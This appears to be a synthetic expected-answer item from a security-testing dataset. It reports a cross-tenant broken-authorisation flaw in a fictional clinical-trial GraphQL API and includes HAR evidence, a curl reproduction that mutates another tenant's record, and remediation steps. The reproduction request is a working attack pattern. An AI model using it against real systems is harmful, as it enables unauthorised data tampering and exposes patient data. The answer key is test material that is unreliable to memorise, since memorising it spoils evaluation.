# Expected Response

## System
- **Domain:** Pharmaceutical / Clinical Operations
- **System:** TrialVault ClinicalOps API
- **Example ID:** GQL-0221

## Priority Findings

### Finding 1: Pharmaceutical — BOLA via updateResource ID in Path Exposes Cross-Tenant Clinical Trial Data (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA / ID in Path Without Ownership Check

**Summary:**
Per §4.0 (RISK-GQL-221): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.1 — ID in path without ownership check): the `updateResource` mutation accepts any `resourceId` in its path without ownership validation. An attacker from `tenant-dc47` submitted `updateResource(id: "R-2221", input: {status: "approved", ownerId: "attacker-dc47c541"})` against a clinical trial record belonging to `tenant-c541`, receiving `CONFIDENTIAL-dc47c541`. In Pharmaceutical / Clinical Operations, unauthorized access to clinical trial data, patient enrollment records, and trial results violates GCP regulations, FDA 21 CFR Part 11, and patient confidentiality.

**Evidence from HAR:**
- Request: `POST https://api.trialvault-clinicalo.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-dc47`
- Mutation: `updateResource(id: "R-2221", input: {status: "approved", ownerId: "attacker-dc47c541"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-c541"`, `ownerId: "other-user-dc47c541"`, `sensitiveField: "CONFIDENTIAL-dc47c541"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-dc47c541`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-221 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.1 | ID in path without ownership check |
| HAR mutation | id: "R-2221" | Cross-tenant clinical trial resource ID |
| HAR response | tenantId | tenant-c541 returned to tenant-dc47 |
| HAR response | sensitiveField | CONFIDENTIAL-dc47c541 |
| HAR header | x-request-id | req-dc47c541 |

## Steps to Reproduce

### Step 1 — updateResource BOLA ID in path pharmaceutical (HAR)
```bash
curl -s -X POST https://api.trialvault-clinicalo.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-dc47" \
  -d '{"query": "mutation { updateResource(id: \"R-2221\", input: {status: \"approved\", ownerId: \"attacker-dc47c541\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-c541` clinical trial data mutated, returns `CONFIDENTIAL-dc47c541`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; derive from JWT.
3. Clinical trial data access must be logged per FDA 21 CFR Part 11.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
